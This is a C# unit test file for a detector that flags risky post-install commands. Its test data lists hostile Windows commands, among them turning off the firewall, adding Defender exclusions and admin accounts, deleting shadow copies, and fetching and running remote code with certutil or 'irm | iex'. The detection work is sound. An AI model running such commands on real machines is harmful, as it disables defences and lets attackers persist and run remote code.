// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using CtrlZ.Core.Install;
using CtrlZ.Core.Models;

namespace CtrlZ.Core.Tests;

public class PostInstallCommandRiskTests
{
    private static PostInstallCommand Command(string exe, params string[] args) =>
        new() { Executable = exe, Arguments = args.ToList(), Enabled = true };

    [Theory]
    [InlineData("reg", "add", @"HKCU\Software\X", "/f")]
    [InlineData("reg.exe", "add", @"HKCU\Software\X", "/f")]
    [InlineData(@"C:\Windows\System32\reg.exe", "add", @"HKCU\Software\X", "/f")]
    [InlineData(@"C:\Windows\System32\REG.EXE", "delete", @"HKCU\Software\X", "/f")]
    [InlineData(@"C:\Windows\System32\sc.exe", "create", "svc", "binPath=", @"C:\x.exe")]
    [InlineData("sc", "config", "svc", "start=", "auto")]
    [InlineData(@"C:\Windows\System32\cmd.exe", "/c", @"reg add HKCU\Software\X /f")]
    [InlineData(@"C:\Windows\System32\schtasks.exe", "/create", "/tn", "x")]
    public void Registry_service_and_task_changes_are_flagged_however_the_program_is_written(string exe, params string[] args)
    {
        Assert.Contains("changes the registry, services or scheduled tasks", PostInstallCommandRisk.Scan(Command(exe, args)));
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\reg.exe", "query", @"HKCU\Software\X")]
    [InlineData(@"C:\Windows\System32\reg.exe", "import", "settings.reg")] // importing an app's settings is the usual safe example
    [InlineData(@"C:\Windows\System32\sc.exe", "query", "svc")]
    [InlineData(@"C:\Windows\System32\whoami.exe", "/user")]
    [InlineData(@"C:\Program Files\Regex Tool\regextool.exe", "add")]
    public void Read_only_and_unrelated_commands_are_not_flagged(string exe, params string[] args)
    {
        Assert.Empty(PostInstallCommandRisk.Scan(Command(exe, args)));
    }

    [Theory]
    [InlineData("weakens security settings", "powershell.exe", "-NoProfile", "-Command", @"Add-MpPreference -ExclusionPath C:\Tools")]
    [InlineData("weakens security settings", @"C:\Windows\System32\netsh.exe", "advfirewall", "set", "allprofiles", "state", "off")]
    [InlineData("weakens security settings", "powershell.exe", "-Command", "Set-NetFirewallProfile -Enabled False")]
    [InlineData("weakens security settings", @"C:\Windows\System32\net.exe", "localgroup", "administrators", "helper", "/add")]
    [InlineData("weakens security settings", "net", "user", "helper", "P4ss", "/add")]
    [InlineData("weakens security settings", "bcdedit.exe", "/set", "testsigning", "on")]
    [InlineData("weakens security settings", "powershell.exe", "-Command", "Set-ExecutionPolicy Bypass -Scope LocalMachine")]
    [InlineData("changes the registry, services or scheduled tasks", "powershell.exe", "-Command", @"Set-ItemProperty -Path HKLM:\Software\X -Name Y -Value 1")]
    [InlineData("changes the registry, services or scheduled tasks", "powershell.exe", "-Command", @"New-Item -Path HKCU:\Software\X")]
    [InlineData("changes the registry, services or scheduled tasks", @"C:\Windows\System32\reg.exe", "restore", @"HKLM\Software\X", "x.hiv")]
    [InlineData("changes the registry, services or scheduled tasks", @"C:\Windows\System32\sc.exe", "sdset", "svc", "D:(A;;GA;;;WD)")]
    [InlineData("changes the registry, services or scheduled tasks", "powershell.exe", "-Command", "Register-ScheduledTask -TaskName x")]
    [InlineData("deletes or writes outside your folders", @"C:\Windows\System32\vssadmin.exe", "delete", "shadows", "/all", "/quiet")]
    [InlineData("downloads and runs remote content", @"C:\Windows\System32\certutil.exe", "-urlcache", "-f", "https://example.com/x.exe", "x.exe")]
    [InlineData("downloads and runs remote content", "powershell.exe", "-Command", "irm https://example.com/x.ps1 | iex")]
    public void Security_firewall_account_and_registry_changes_are_flagged(string label, string exe, params string[] args)
    {
        Assert.Contains(label, PostInstallCommandRisk.Scan(Command(exe, args)));
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\netsh.exe", "advfirewall", "show", "allprofiles")]
    [InlineData(@"C:\Windows\System32\net.exe", "use", "Z:", @"\\server\share")]
    [InlineData("powershell.exe", "-Command", @"Get-ItemProperty -Path HKLM:\Software\X")]
    [InlineData("powershell.exe", "-Command", @"New-Item -ItemType Directory -Path $env:LOCALAPPDATA\Tools")]
    [InlineData(@"C:\Windows\System32\certutil.exe", "-hashfile", "setup.exe", "SHA256")]
    [InlineData(@"C:\Windows\System32\vssadmin.exe", "list", "shadows")]
    [InlineData(@"C:\Program Files\dotnet\dotnet.exe", "user-secrets", "list")]
    public void Look_alike_read_only_commands_are_not_flagged(string exe, params string[] args)
    {
        Assert.Empty(PostInstallCommandRisk.Scan(Command(exe, args)));
    }
}
